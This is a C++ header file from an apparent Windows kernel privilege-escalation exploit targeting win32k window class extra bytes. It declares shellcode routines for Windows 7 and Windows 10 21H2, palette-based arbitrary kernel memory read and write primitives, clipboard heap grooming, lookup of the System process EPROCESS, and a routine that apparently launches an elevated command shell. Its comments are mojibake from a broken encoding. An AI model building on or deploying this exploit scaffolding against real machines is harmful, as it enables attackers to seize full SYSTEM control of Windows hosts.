#pragma once
#include <cstdio>
#include <windows.h>
#include <Psapi.h>
#pragma comment(linker, "/defaultlib:Psapi.lib")

#define PAGE_SIZE 0x1000
#define TYPE_WINDOW 1
#define POOL_HEADER_SIZE 0x10

typedef DWORD64 QWORD;
typedef PDWORD64 PQWORD;

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

typedef struct _HEAD
{
	HANDLE h;
	DWORD clockObj;
}HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
}THROBJHEAD, *PTHROBJHEAD;

typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID rpdesk;
	PVOID pSelf;
}THRDESKHEAD, *PTHRDESKHEAD;

typedef PVOID (NTAPI *lHMValidateHandle)(HWND hWnd, int type);
typedef NTSTATUS (WINAPI* lpfnNtQueryIntervalProfile)(IN QWORD Src, IN OUT PQWORD Profile);
typedef NTSTATUS (__fastcall *lpfnxxxClientAllocWindowClassExtraBytes)(PVOID arg0);
typedef NTSTATUS (__fastcall *lpfnNtUserConsoleControl)(LONG64 nIndex, PVOID pInfo, ULONG64 nInLength);
typedef NTSTATUS (__fastcall *lpfnNtCallbackReturn)(PVOID Result, ULONG ResultLength, NTSTATUS status);
typedef NTSTATUS (__fastcall *lpfnNtUserMessageCall)(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAnsi);
typedef NTSTATUS (__fastcall *lpfnxxxClientFreeWindowClassExtraBytes)(PVOID pInfo);

EXTERN_C_START
ULONG64 GetPEB();
NTSTATUS ShellCodeInWin7();
NTSTATUS ShellCodeInWin10_21H2();
EXTERN_C_END

VOID ShowError(char *str, DWORD dwErrorCode);				// ��ӡ������Ϣ
BOOL CreateCmd();											// ����CMD����
ULONG64 GetNTBase();										// ��ȡntos��ַ
ULONG64 GetSystemProcess();									// ��ȡSystem����EPROCESS
QWORD GetKeFlushCurrentTbImmediately();
BOOL CreateClipboard(DWORD dwSize);							// ͨ�����а�ʵ�ֵ�Ƭ����,dwSize + 0x14 + 0x10���ڴ��
PVOID GetHMValidateHandle();								// ��ȡHMValidateHandle������ַ
PVOID GetHalQuerySystemInformation();						// ��ȡHalQuerySystemInformation������ַ
BOOL CallNtQueryIntervalProfile();							// ����NtQueryIntervalProfile����
HPALETTE CreatePaletteBySize(DWORD dwSize);					// ����dwSize��С��PALETTE����
ULONG64 AllocateFreeWindow(DWORD dwSize);					
ULONG64 AllocateFreeWindows(DWORD dwSize);
ULONG64 AllocateWindows(PWCHAR pMenuName, PWCHAR pClassName);
BOOL SetPaletteTarget(HPALETTE hManager, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress);
ULONG64 ReadDataByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress);
BOOL WriteDataByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress, ULONG64 ulValue);
ULONG64 GetSystemEprocessByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries);